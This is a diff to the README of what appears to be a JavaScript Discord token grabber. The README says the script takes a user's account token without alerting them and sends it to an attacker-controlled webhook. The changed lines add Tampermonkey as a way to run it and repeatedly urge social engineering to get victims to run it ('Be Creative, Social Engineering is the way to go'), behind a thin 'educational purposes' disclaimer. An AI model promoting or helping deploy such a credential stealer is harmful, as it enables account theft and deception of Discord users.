@@ -8,16 +8,21 @@
 > 3. Does not alert the user that the token has been grabbed.
 -------------------
 * ## How Can I Use It?
+> You can use it with [tampermonkey](https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=en) directly (Chrome Extention).
+
 > Well this is an example of how javascript can be utilized in order to obtain the discord token.
-> Just be creative, for example you can use this script with Social Engineering technique.
+
+> Be Creative, Social Engineering is the way to go.
+
 > Of course this is for educational purposes and i don't hold any responsibility for your actions.
 -------------------
+
 * ## What you need to edit!
-> 1. Change the discord webhook URL.
+> 1. Change the discord webhook URL in order to retrieve the results.
 
 > ![Webhook-shot](https://i.imgur.com/o70j39J.png)
 
-> 2. Social Engineering :)
+> 2. Happy Social Engineering :)
 -------------------
 * ### Credits
 > **iHavoc101#6156.**
